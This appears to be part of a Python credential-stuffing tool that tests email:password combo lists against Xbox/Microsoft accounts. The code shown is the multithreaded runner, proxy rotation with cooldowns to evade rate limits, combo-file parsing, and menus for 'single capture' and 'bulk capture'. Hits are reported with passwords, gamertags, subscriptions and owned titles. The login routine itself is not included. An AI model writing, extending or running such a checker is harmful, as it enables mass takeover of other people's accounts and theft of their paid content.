def filter_proxies(proxies):
    if not proxies: return []
    total = len(proxies)
    good, done = [], [0]
    lock = threading.Lock()
    CONSOLE.print(f"[{TEAL}]▸[/{TEAL}] testing [bright_white]{total}[/bright_white] proxies")

    def worker(p):
        ok = probe_proxy(p)
        with lock:
            done[0] += 1
            if ok: good.append(p)
            if done[0] % 25 == 0 or done[0] == total:
                CONSOLE.print(f"[{MUTED}]▸ {done[0]}/{total} -- {len(good)} alive[/{MUTED}]")

    with ThreadPoolExecutor(max_workers=min(60, max(1, total))) as ex:
        for f in as_completed([ex.submit(worker, p) for p in proxies]):
            try: f.result()
            except Exception: pass
    if not good:
        CONSOLE.print(f"[{ERR}]▸ 0/{total} alive -- direct mode[/{ERR}]")
        return []
    CONSOLE.print(f"[{MINT}]▸ {len(good)}/{total} alive[/{MINT}]")
    return good

def pick_proxy():
    if not PROXIES: return None
    now = time.time()
    with PROXY_LOCK:
        avail = [p for p in PROXIES if p not in PROXY_DEAD
                 and PROXY_COOL.get(p, 0.0) <= now and p not in PROXY_BUSY]
        if not avail:
            avail = [p for p in PROXIES if p not in PROXY_DEAD
                     and PROXY_COOL.get(p, 0.0) <= now]
        if not avail: return None
        p = random.choice(avail); PROXY_BUSY.add(p)
    return p

def release_proxy(p):
    if not p: return
    with PROXY_LOCK: PROXY_BUSY.discard(p)

def kill_proxy(p):
    if not p: return
    with PROXY_LOCK: PROXY_DEAD.add(p)

def cool_proxy(p, secs=120.0):
    if not p: return
    with PROXY_LOCK: PROXY_COOL[p] = time.time() + secs

# ─────────────────────────── worker ──────────────────────────

def worker(combo, total):
    if STOP.is_set(): return
    while RATE_UNTIL[0] > time.time():
        if STOP.wait(min(1.0, RATE_UNTIL[0] - time.time())): return
    if STOP.is_set(): return

    tries = CONFIG["retries"] + 1
    last_proxy = None
    result = None
    for attempt in range(tries):
        if STOP.is_set(): break
        proxy = pick_proxy(); last_proxy = proxy
        try:
            result = audit_combo(combo, proxy)
        except Exception as e:
            result = {"status": "error", "reason": f"runner:{type(e).__name__}",
                      "email": combo.split(":", 1)[0]}
        finally:
            if proxy: release_proxy(proxy)

        if result.get("status") in ("ok", "bad", "no_xbox"): break
        reason = result.get("reason", "")
        if reason == "rate_limited":
            with STATE_LOCK: STATS["rl"] += 1
            if last_proxy: cool_proxy(last_proxy, 120.0)
            RATE_UNTIL[0] = max(RATE_UNTIL[0], time.time() + CONFIG["retries"] * 15)
            if STOP.wait(15 * (0.7 + random.random() * 0.6)): break
            continue
        if reason.startswith(("net:", "submit:", "xbl_net", "xsts_net")):
            if last_proxy: kill_proxy(last_proxy)
            if STOP.wait(1.5): break
            continue
        if reason in ("no_ppft", "no_token"):
            if STOP.wait(0.6 + random.random() * 0.6): break
            continue
        break

    try:
        record(result or {"status": "error", "reason": "no_result",
                          "email": combo.split(":", 1)[0]}, total)
    except Exception: pass

class Runner:
    def __init__(self, combos):
        self.combos = combos
        self.threads = CONFIG["threads"]
        self.chunk = max(self.threads * 4, 200)

    def run(self):
        inflight = set()
        ex = ThreadPoolExecutor(max_workers=self.threads)
        total = len(self.combos)
        try:
            for i in range(0, total, self.chunk):
                if STOP.is_set(): break
                for c in self.combos[i:i + self.chunk]:
                    if STOP.is_set(): break
                    inflight.add(ex.submit(worker, c, total))
                while inflight:
                    done, _ = wait(inflight, timeout=0.4, return_when=FIRST_COMPLETED)
                    for f in done:
                        inflight.discard(f)
                        try: f.result(timeout=0.1)
                        except Exception: pass
                    if STOP.is_set() and not done: break
            while inflight:
                done, _ = wait(inflight, timeout=0.4, return_when=FIRST_COMPLETED)
                for f in done:
                    inflight.discard(f)
                    try: f.result(timeout=0.1)
                    except Exception: pass
        except KeyboardInterrupt:
            STOP.set()
        finally:
            STOP.set()
            try: ex.shutdown(wait=True, cancel_futures=True)
            except TypeError: ex.shutdown(wait=True)

# ─────────────────────────── combo io ────────────────────────

def parse_combos(text):
    out = set(); skipped = 0
    for raw in text.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"): continue
        m = COMFORMA.match(line)
        if m: out.add(f"{m.group(1).lower()}:{m.group(2)}")
        else: skipped += 1
    if skipped: CONSOLE.print(f"[{MUTED}]▸ {skipped} lines skipped[/{MUTED}]")
    return sorted(out)

def list_combo_files():
    cwd = os.getcwd()
    files = sorted(f for f in os.listdir(cwd) if f.lower().endswith(".txt"))
    if not files: return None
    grid = Table(show_header=False, box=None, width=90, padding=(0, 1))
    grid.add_column(justify="right", style=MUTED, no_wrap=True, width=6)
    grid.add_column(justify="left", style="bright_white", overflow="fold")
    grid.add_column(justify="right", style=MUTED, no_wrap=True, width=14)
    for i, f in enumerate(files, 1):
        try:
            with open(os.path.join(cwd, f), "r", encoding="utf-8", errors="ignore") as fh:
                n = sum(1 for ln in fh if ln.strip())
        except Exception: n = 0
        grid.add_row(f"[{i:02d}]", f, f"{n:,} lines")
    CONSOLE.print()
    CONSOLE.print(Panel(grid, box=ROUNDED, border_style=TEAL_DIM,
                        width=96, padding=(1, 2),
                        title="input files", title_align="left"))
    CONSOLE.print()
    raw = ask("select")
    if not raw: return None
    try:
        idx = int(raw) - 1
        if 0 <= idx < len(files): return os.path.join(cwd, files[idx])
    except ValueError: pass
    return None

# ─────────────────────────── menus ───────────────────────────

def prompt_threads():
    section("threads")
    CONSOLE.print(f"   current  [bright_white]{CONFIG['threads']}[/bright_white]")
    CONSOLE.print(f"   range    [bright_white]1-200[/bright_white]")
    raw = ask("threads")
    if not raw: return
    try: CONFIG["threads"] = max(1, min(200, int(raw)))
    except ValueError: pass

def prompt_games():
    section("titles to display")
    CONSOLE.print(f"   current  [bright_white]{CONFIG['max_games']}[/bright_white]")
    CONSOLE.print(f"   range    [bright_white]1-500, 0 = all[/bright_white]")
    raw = ask("count")
    if not raw: return
    try:
        n = int(raw); CONFIG["max_games"] = 500 if n <= 0 else max(1, min(500, n))
    except ValueError: pass

def single_check():
    STOP.clear(); paint_banner(); section("single capture")
    combo = ask("email:password")
    if ":" not in combo:
        CONSOLE.print(f"[{ERR}]▸ invalid format[/{ERR}]")
        try: input("enter to continue...")
        except (KeyboardInterrupt, EOFError): pass
        return
    prompt_games()
    CONSOLE.print(f"[{TEAL}]▸ auditing {combo.split(':')[0]} ...[/{TEAL}]")
    t0 = time.time()
    result = audit_combo(combo, pick_proxy() if PROXIES else None)
    elapsed = time.time() - t0
    section("result")
    st = result.get("status")
    if st == "ok":
        v = result["verdict"]; color = STATUS_COLOR.get(v, "bright_white")
        label = STATUS_LABEL.get(v, v.upper())
        glyph = STATUS_GLYPH.get(v, "·")
        subs = result.get("subs") or []
        pairs = [
            ("email",      safe(result.get("email"))),
            ("password",   safe(result.get("password"))),
            ("xuid",       safe(result.get("xuid"))),
            ("gamertag",   safe(result.get("gamertag"))),
            ("gamerscore", safe(result.get("gamerscore"))),
            ("tenure",     safe(result.get("tenure"))),
            ("tier",       safe(result.get("tier")) or "Silver"),
            ("location",   safe(result.get("location"))),
            ("titles",     safe(result.get("games_count"))),
            ("premium",    safe(result.get("premium_count"))),
            ("entitlements", safe(result.get("entitlement_count"))),
            ("subs",       f"{result.get('active_subs', 0)} active / {result.get('subs_count', 0)} total"),
            ("elapsed",    f"{elapsed:.2f}s"),
        ]
        if subs:
            pairs.append(("subscriptions", fmt_subs(subs, CONFIG["max_subs"])))
        games_str = fmt_games(result.get("games") or [], CONFIG["max_games"])
        if games_str and games_str != "None":
            pairs.append(("titles list", games_str[:170]))
        CONSOLE.print(kv_panel(f"[{color}]{glyph} {label}[/{color}]", pairs,
                                box=STATUS_BOX.get(v, ROUNDED), color=color))
    else:
        color = MUTED if st == "bad" else ERR
        label = STATUS_LABEL.get(st, st.upper())
        glyph = STATUS_GLYPH.get(st, "·")
        CONSOLE.print(kv_panel(
            f"[{color}]{glyph} {label}[/{color}]",
            [("email", safe(combo.split(":")[0])),
             ("reason", safe(result.get("reason")))],
            box=SQUARE, color=color))
    try: input("enter to continue...")
    except (KeyboardInterrupt, EOFError): pass

def bulk_check():
    STOP.clear(); paint_banner(); section("bulk capture")
    path = list_combo_files()
    if not path:
        CONSOLE.print(f"[{ERR}]▸ no file selected[/{ERR}]")
        try: input("enter to continue...")
        except (KeyboardInterrupt, EOFError): pass
        return

    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        combos = parse_combos(f.read())
    if not combos:
        CONSOLE.print(f"[{ERR}]▸ no valid combos[/{ERR}]")
        try: input("enter to continue...")
        except (KeyboardInterrupt, EOFError): pass
        return

    CONSOLE.print(f"[{MINT}]▸ {len(combos)} unique combos loaded[/{MINT}]")
    prompt_threads(); prompt_games()

    try: open_result_files()
    except Exception as e:
        CONSOLE.print(f"[{ERR}]▸ file io: {e}[/{ERR}]"); return

    global PROXIES
    if PROXIES: PROXIES = filter_proxies(PROXIES)

    CONSOLE.print(f"[{MINT}]▸ starting {len(combos)} combos · {CONFIG['threads']} threads[/{MINT}]")
    t0 = time.time()
    try:
        Runner(combos).run()
    except KeyboardInterrupt:
        STOP.set(); CONSOLE.print(f"[{MUTED}]▸ stopping...[/{MUTED}]")
    finally:
        STOP.set()
        for h in FILE_HANDLES.values():
            try: h.close()
            except Exception: pass
        FILE_HANDLES.clear()

    elapsed = time.time() - t0
    section("summary")
    rows = [
        ("total",         len(combos)),
        ("subscribed",    STATS["premium"]),
        ("owned",         STATS["hit"]),
        ("blank",         STATS["free"]),
        ("no-profile",    STATS["no_xbox"]),
        ("denied",        STATS["bad"]),
        ("faults",        STATS["error"]),
        ("rate-ltd",      STATS["rl"]),
        ("active subs",   STATS["subs_total"]),
        ("elapsed",       f"{elapsed:.1f}s"),
        ("speed",         f"{len(combos) / max(elapsed, 0.001):.2f} c/s"),
        ("output",        result_dir()),
    ]
    CONSOLE.print(kv_panel("stats", rows, box=HEAVY, color=TEAL_DIM))
    try: input("enter to continue...")
    except (KeyboardInterrupt, EOFError): pass

def settings_menu():
    paint_banner(); section("settings")
    rows = [
        ("[1]", f"threads        {CONFIG['threads']}"),
        ("[2]", f"retries        {CONFIG['retries']}"),
        ("[3]", f"proxies file   {CONFIG['proxies_file']}"),
        ("[4]", f"max titles     {CONFIG['max_games']}"),
        ("[5]", f"max subs shown {CONFIG['max_subs']}"),
        ("[6]", f"auto-open link {'on' if CONFIG['redirect'] else 'off'}"),
        ("[7]", "open channel now"),
        ("[0]", "back"),
    ]
    grid = Table(show_header=False, box=None, width=90, padding=(0, 1))
    grid.add_column(justify="left", style=TEAL, no_wrap=True, width=6)
    grid.add_column(justify="left", style="bright_white", overflow="fold")
    for a, b in rows: grid.add_row(a, b)
    CONSOLE.print(Panel(grid, box=DOUBLE, border_style=TEAL_DIM, width=96,
                        padding=(1, 2), title="settings", title_align="left",
                        subtitle=f"· {CHANNEL_TAG} ·", subtitle_align="right"))
    CONSOLE.print()
    ch = ask("select")
    if ch == "1":
        try: CONFIG["threads"] = max(1, min(200, int(ask("threads"))))
        except (ValueError, TypeError): pass
    elif ch == "2":
        try: CONFIG["retries"] = max(0, min(5, int(ask("retries"))))
        except (ValueError, TypeError): pass
    elif ch == "3":
        v = ask("proxies file")
        if v: CONFIG["proxies_file"] = v
    elif ch == "4":
        prompt_games()
    elif ch == "5":
        try: CONFIG["max_subs"] = max(1, min(20, int(ask("max subs shown"))))
        except (ValueError, TypeError): pass
    elif ch == "6":
        CONFIG["redirect"] = not CONFIG["redirect"]
    elif ch == "7":
        trigger_redirect()

def main_menu_panel():
    grid = Table(show_header=False, box=None, width=90, padding=(0, 1))
    grid.add_column(justify="left", style=TEAL, no_wrap=True, width=8)
    grid.add_column(justify="left", style="bright_white", overflow="fold")
    grid.add_row("", "")
    grid.add_row(f"[{CORAL}]▸ state[/{CORAL}]", "")
    grid.add_row("proxies", f"[{MINT}]{len(PROXIES)} alive[/{MINT}]" if PROXIES else f"[{MUTED}]direct[/{MUTED}]")
    grid.add_row("threads", str(CONFIG["threads"]))
    grid.add_row("build",   BUILD_TAG)
    grid.add_row("", "")
    grid.add_row(f"[{CORAL}]▸ actions[/{CORAL}]", "")
    grid.add_row("[1]", "single capture")
    grid.add_row("[2]", "bulk capture")
    grid.add_row("[3]", "settings")
    grid.add_row("[4]", f"[{MUTED}]exit[/{MUTED}]")
    grid.add_row("", "")
    return Panel(grid, box=DOUBLE, border_style=TEAL_DIM, width=96,
                 padding=(1, 2), title="menu", title_align="left",
                 subtitle=f"· {CHANNEL_TAG} ·", subtitle_align="right")

def run():
    global PROXIES

    if CONFIG["redirect"]:
        threading.Thread(target=trigger_redirect, daemon=True).start()

    pfile = Path.cwd() / CONFIG["proxies_file"]
    raw = load_proxies(str(pfile))
    if raw: PROXIES = filter_proxies(raw)

    while True:
        paint_banner()
        CONSOLE.print(main_menu_panel())
        CONSOLE.print()
        try: ch = ask("select")
        except (KeyboardInterrupt, EOFError): break
        if ch == "1": single_check()
        elif ch == "2": bulk_check()
        elif ch == "3": settings_menu()
        elif ch == "4":
            CONSOLE.print(f"[{MUTED}]▸ exiting[/{MUTED}]"); break
        elif ch.lower() == "r":
            trigger_redirect()
        else:
            CONSOLE.print(f"[{ERR}]▸ invalid[/{ERR}]")

if __name__ == "__main__":
    try:
        run()
    except KeyboardInterrupt:
        CONSOLE.print(f"\n[{MUTED}]interrupted[/{MUTED}]")
    except Exception as e:
        CONSOLE.print(f"\n[{ERR}]xx {type(e).__name__}: {e}[/{ERR}]")